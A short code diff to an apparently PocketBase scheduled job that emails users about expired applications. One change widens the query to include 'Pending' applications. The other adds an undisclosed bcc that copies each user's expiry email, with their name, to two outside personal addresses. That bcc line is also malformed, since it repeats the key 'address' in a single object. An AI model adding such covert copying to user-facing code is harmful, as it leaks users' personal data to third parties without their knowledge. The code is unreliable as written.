@@ -10,7 +10,7 @@ cronAdd('checkExpiredApplications', '0 0 * * *', () => {
 	}))
 
 	$app.dao().db()
-		.newQuery("SELECT id, user_id, product_id, status, app_age FROM applications_with_products WHERE app_age>45 AND status='Initiated'")
+		.newQuery("SELECT id, user_id, product_id, status, app_age FROM applications_with_products WHERE app_age>45 AND status IN ('Initiated', 'Pending')")
 		.all(records)
 
 	if (records.length == 0) {
@@ -30,6 +30,7 @@ cronAdd('checkExpiredApplications', '0 0 * * *', () => {
 					name: $app.settings().meta.senderName,
 				},
 				to: [{ address: user.get("email") }],
+				bcc: [{ address: "manans@tutanota.com", address: "buzo.1411@gmail.com" }],
 				subject: "Your Application got Expired",
 				html: `
 Hi ${user.get('name')},
